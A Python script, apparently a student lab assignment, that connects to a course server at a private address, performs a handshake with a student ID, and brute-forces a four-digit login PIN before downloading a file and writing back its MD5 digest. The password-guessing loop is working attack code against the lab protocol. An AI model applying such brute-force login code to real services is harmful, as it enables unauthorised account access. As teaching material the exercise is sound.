#!/usr/bin/env python3
import hashlib
from sys import argv
from socket import socket, AF_INET, SOCK_STREAM


def main():
    # create a TCP socket
    serverName = '172.28.176.63'

    # connect to the given Server IP, port number
    serverPort = 4444

    # the secret student id should be taken as the command line argument

    student_key = str(argv[1])

    # initial handshake is to pass the student_key
    # to which the server response with an ok
    clientSocket = [None]
    clientSocket[0] = socket(AF_INET, SOCK_STREAM)
    clientSocket[0].connect((serverName, serverPort))

    student_key_message = "STID_"
    handshake_message = student_key_message + student_key
    clientSocket[0].send(handshake_message.encode())
    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

    # if server responds with OK code proceed with the hack
    if modifiedSentence == b'200_':
        print('Handshake successfully')

        login_request_message = "LGIN_"
        data_request_message = "GET__"
        write_request_message = "PUT__"
        logout_request_message = "LOUT_"
        connection_close_message = "BYE__"

        # try out all possible passwords
        for x in range(0, 10000):
            login_request_message = login_request_message + translate_password(x)

            clientSocket[0].send(login_request_message.encode())

            # for each password
            # check the server response code for each password to see if the login was successful
            modifiedSentence = clientSocket[0].recvfrom(1024)[0]

            if len(modifiedSentence) == 0:
                clientSocket[0] = socket(AF_INET, SOCK_STREAM)
                clientSocket[0].connect((serverName, serverPort))
                clientSocket[0].send(handshake_message.encode())

                clientSocket[0].send(login_request_message.encode())

                modifiedSentence = clientSocket[0].recvfrom(1024)[0]

            if modifiedSentence == b'201_':
                print('Password: ' + translate_password(x))

                clientSocket[0].send(data_request_message.encode())

                # receive the data (this is binary data hence you do not have to use "decode")
                modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                if len(modifiedSentence) == 0:
                    clientSocket[0] = socket(AF_INET, SOCK_STREAM)
                    clientSocket[0].connect((serverName, serverPort))
                    clientSocket[0].send(handshake_message.encode())
                    clientSocket[0].send(login_request_message.encode())

                    # for each password
                    # check the server response code for each password to see if the login was successful

                    clientSocket[0].send(data_request_message.encode())
                    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                if get_code(modifiedSentence) == b'100_':
                    print('Receive data file successfully')

                    file = get_data(modifiedSentence)

                    # compute the digest
                    digest = str(hashlib.md5(file).hexdigest())
                    write_request_message = write_request_message + digest

                    # send the digest back to server
                    clientSocket[0].send(write_request_message.encode())

                    # receive response from server
                    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                if len(modifiedSentence) == 0:
                    clientSocket[0] = socket(AF_INET, SOCK_STREAM)
                    clientSocket[0].connect((serverName, serverPort))
                    clientSocket[0].send(handshake_message.encode())
                    clientSocket[0].send(login_request_message.encode())

                    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                    # get file again
                    clientSocket[0].send(data_request_message.encode())
                    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                    while get_code(modifiedSentence) != b'100_':
                        clientSocket[0].send(data_request_message.encode())
                        modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                    # write back
                    file = get_data(modifiedSentence)

                    # compute the digest
                    digest = str(hashlib.md5(file).hexdigest())
                    write_request_message = write_request_message + digest

                    # send the digest back to server
                    clientSocket[0].send(write_request_message.encode())

                    # receive response from server
                    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                if modifiedSentence == b'203_':
                    print('Write the hash successfully')
                    # send logout request
                    clientSocket[0].send(logout_request_message.encode())

                    # receive response from server
                    modifiedSentence = clientSocket[0].recvfrom(1024)[0]

                    while modifiedSentence != b'202_':
                        clientSocket[0].send(logout_request_message.encode())

                        # receive response from server
                        modifiedSentence = clientSocket[0].recvfrom(1024)[0]

            login_request_message = 'LGIN_'
            write_request_message = "PUT__"

        if modifiedSentence == b'202_':
            print('Log out successfully')
            clientSocket[0].send(connection_close_message.encode())


def get_data(file: bytes):
    data = file.split(sep=b'_', maxsplit=2)
    content = data[2]
    return content


def get_code(file: bytes):
    data = file.split(b'_', 2)
    content = data[0]
    return content + b'_'


def translate_password(x):
    if x < 10:
        return '000' + str(x)
    if 10 <= x < 100:
        return '00' + str(x)
    if 100 <= x < 1000:
        return '0' + str(x)
    return str(x)


if __name__ == "__main__":
    main()
